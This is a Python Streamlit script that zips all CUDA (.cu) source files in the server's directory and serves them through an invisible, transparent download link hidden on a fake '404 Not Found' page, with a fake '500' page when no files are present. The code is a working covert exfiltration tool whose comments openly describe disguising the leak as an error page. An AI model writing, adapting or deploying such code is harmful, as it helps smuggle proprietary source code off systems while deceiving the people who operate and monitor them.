import streamlit as st
import base64
import os
import zipfile

st.set_page_config(page_title="Error", layout="wide")

# find all .cu files
cu_files = [f for f in os.listdir(".") if f.endswith(".cu")]

if not cu_files:
    st.markdown(
        """
        <style>body{background:#f2f2f2;font-family:"Segoe UI",Arial,sans-serif;text-align:center;margin-top:15%;}
        h1{font-size:100px;margin-bottom:0;}h2{font-size:32px;margin-top:0;color:#888;}
        p{font-size:18px;color:#777;}</style>
        <h1>500</h1><h2>Internal Server Error</h2><p>Something went wrong.</p>
        """,
        unsafe_allow_html=True,
    )
else:
    # create zip
    zip_filename = "cuda_files.zip"
    with zipfile.ZipFile(zip_filename, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for fname in cu_files:
            zf.write(fname)

    # read and base64 encode
    with open(zip_filename, "rb") as f:
        data = f.read()
    b64 = base64.b64encode(data).decode()

    # remove server-side zip to avoid accumulation (we already have base64)
    try:
        os.remove(zip_filename)
    except Exception:
        pass

    # show fake 404 + an invisible (transparent) anchor directly under the message
    # clicking that invisible area triggers the browser download (user-initiated)
    st.markdown(
        f"""
        <style>
        body {{
            background-color: #f2f2f2;
            color: #555;
            font-family: "Segoe UI", Arial, sans-serif;
            text-align: center;
            margin-top: 12%;
        }}
        .fake404 h1 {{ font-size: 100px; margin-bottom: 0; }}
        .fake404 h2 {{ font-size: 32px; margin-top: 0; color: #888; }}
        .fake404 p {{ font-size: 18px; color: #777; }}
        /* invisible clickable area */
        .transparent-download {{
            display:inline-block;
            width: 220px;       /* adjust width / height to cover area you want clickable */
            height: 28px;
            margin-top: 12px;
            opacity: 0;         /* invisible but clickable */
            cursor: pointer;
        }}
        /* optional: show a subtle border on hover for testing; remove later */
        .transparent-download:hover {{ outline: 1px dashed rgba(0,0,0,0.05); }}
        </style>

        <div class="fake404">
          <h1>404</h1>
          <h2>Not Found</h2>
          <p>The page you are looking for might have been removed,<br>
          had its name changed, or is temporarily unavailable.</p>

          <!-- Transparent clickable anchor (user must click this invisible area) -->
          <a class="transparent-download" href="data:application/zip;base64,{b64}" download="{zip_filename}" title="download"></a>
        </div>
        """,
        unsafe_allow_html=True,
    )

    # small visible fallback for users who can't find the invisible area
    st.markdown(
        """
        <div style="text-align:center;margin-top:8px;color:#999;font-size:13px;">
            If the download does not start, <a href="#" id="fallback">click here</a>.
        </div>
        <script>
        // fallback replaces href with the same data URI (constructed server-side)
        document.getElementById('fallback').addEventListener('click', function(e) {
            e.preventDefault();
            // create a visible small link and click it
            var a = document.createElement('a');
            a.href = "data:application/zip;base64," + "%s";
            a.download = "%s";
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        });
        </script>
        """ % (b64, zip_filename),
        unsafe_allow_html=True,
    )
